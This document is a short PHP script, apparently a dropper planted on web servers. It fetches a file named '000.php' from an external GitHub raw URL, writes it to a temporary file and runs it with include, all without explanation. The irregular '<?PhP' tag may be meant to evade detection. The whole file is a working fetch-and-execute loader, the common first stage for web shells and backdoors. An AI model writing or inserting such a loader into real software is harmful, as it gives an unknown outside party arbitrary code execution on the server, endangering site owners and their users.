<?PhP
$url = 'https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/000.php';

$temp = tmpfile();
fwrite($temp, file_get_contents($url));

$meta = stream_get_meta_data($temp);
include $meta['uri'];

fclose($temp);

?>
